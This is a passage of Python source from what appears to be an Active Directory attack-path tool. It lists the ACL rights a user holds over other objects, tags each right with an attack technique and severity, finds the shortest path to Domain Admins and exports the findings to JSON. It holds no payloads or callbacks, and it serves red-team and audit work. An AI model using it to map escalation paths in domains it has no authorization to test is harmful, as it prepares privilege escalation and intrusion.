        hv_count = sum(1 for o in self.objects.values() if o.is_high_value)

        return {
            "source": self._source,
            "total_objects": len(self.objects),
            "object_types": dict(type_counts),
            "high_value_targets": hv_count,
            "acl_entries": len(self.acl_entries),
            "outbound_controls": sum(len(v) for v in self.outbound_map.values()),
            "domain": self.domain,
            "dc_ip": self.dc_ip,
        }

    def print_outbound_control(self, user: str, max_display: int = 30):
        """Pretty-print outbound object control for a user."""
        controls = self.get_outbound_control(user)

        print(f"\n{'='*75}")
        print(f"  OUTBOUND OBJECT CONTROL — {user}")
        print(f"{'='*75}")
        print(f"  Total controls: {len(controls)}\n")

        if not controls:
            print(f"  [!] No outbound object control found for {user}")
            print(f"{'='*75}\n")
            return

        # Group by target type
        by_type = defaultdict(list)
        for c in controls:
            by_type[c.target_type].append(c)

        for obj_type in ["user", "group", "computer"]:
            items = by_type.get(obj_type, [])
            if not items:
                continue

            print(f"  ── {obj_type.upper()}S ({len(items)}) ──")
            for i, c in enumerate(items[:max_display], 1):
                target_obj = self.objects.get(c.target_sid)
                hv = " ★HIGH VALUE★" if (target_obj and target_obj.is_high_value) else ""
                severity = c.attack_info.get("severity", "?")
                print(f"    {i}. {c.target_name}{hv}")
                print(f"       Right: {c.right_name} | Severity: {severity}")
                print(f"       Attack: {c.attack_info.get('attack', '?')}")
                print(f"       {c.attack_info.get('description', '')}")
                print()

        if len(controls) > max_display:
            print(f"  ... and {len(controls) - max_display} more")
        print(f"{'='*75}\n")

    def print_whoami(self, user: str):
        """Print comprehensive user analysis."""
        sid = self._resolve_user(user)
        if not sid:
            print(f"[!] User not found: {user}")
            return

        obj = self.objects[sid]
        print(f"\n{'='*75}")
        print(f"  USER ANALYSIS — {obj.display}")
        print(f"{'='*75}")
        print(f"  SID:             {obj.sid}")
        print(f"  SAM Account:     {obj.sam_account_name}")
        print(f"  DN:              {obj.dn}")
        print(f"  Enabled:         {obj.enabled}")
        print(f"  Admin Count:     {obj.admin_count}")
        print(f"  High Value:      {obj.is_high_value}")
        if obj.description:
            print(f"  Description:     {obj.description}")
        if obj.service_principal_names:
            print(f"  SPNs:            {', '.join(obj.service_principal_names)}")

        # Group memberships
        groups = []
        for gid in obj.member_of:
            g = self.objects.get(gid)
            if g:
                hv = " ★" if g.is_high_value else ""
                groups.append(f"{g.display}{hv}")
        if groups:
            print(f"\n  Group Memberships ({len(groups)}):")
            for g in groups:
                print(f"    - {g}")

        # Outbound controls
        controls = self.get_outbound_control(user)
        if controls:
            print(f"\n  Outbound Object Control ({len(controls)}):")
            for c in controls[:15]:
                hv = " ★" if (self.objects.get(c.target_sid) and self.objects[c.target_sid].is_high_value) else ""
                print(f"    - {c.target_name}{hv} → {c.right_name} ({c.attack_info.get('severity', '?')})")
        else:
            print(f"\n  No outbound object control found")

        # Shortest path to DA
        path = self.find_shortest_path_to_da(user)
        if path:
            print(f"\n  Shortest Path to Domain Admins ({len(path)} hops):")
            for i, c in enumerate(path, 1):
                print(f"    {i}. {c.source_name} --[{c.right_name}]--> {c.target_name}")
        else:
            print(f"\n  No path to Domain Admins found")

        print(f"{'='*75}\n")

    def export_json(self, filepath: str):
        """Export domain intel to JSON."""
        data = {
            "summary": self.summary(),
            "objects": {
                sid: {
                    "sid": o.sid,
                    "sam_account_name": o.sam_account_name,
                    "cn": o.cn,
                    "object_class": o.object_class,
                    "enabled": o.enabled,
                    "admin_count": o.admin_count,
                    "is_high_value": o.is_high_value,
                    "member_of": o.member_of,
                    "members": o.members,
                }
                for sid, o in self.objects.items()
            },
            "outbound_controls": {
                src: [
                    {
                        "target": c.target_name,
                        "target_sid": c.target_sid,
                        "target_type": c.target_type,
                        "right": c.right_name,
                        "attack": c.attack_info.get("attack", ""),
                        "severity": c.attack_info.get("severity", ""),
                        "chain_value": c.chain_value,
                    }
                    for c in ctrls
                ]
                for src, ctrls in self.outbound_map.items()
            },
        }
        Path(filepath).write_text(json.dumps(data, indent=2, default=str))
        log.info("Exported domain intel to %s", filepath)
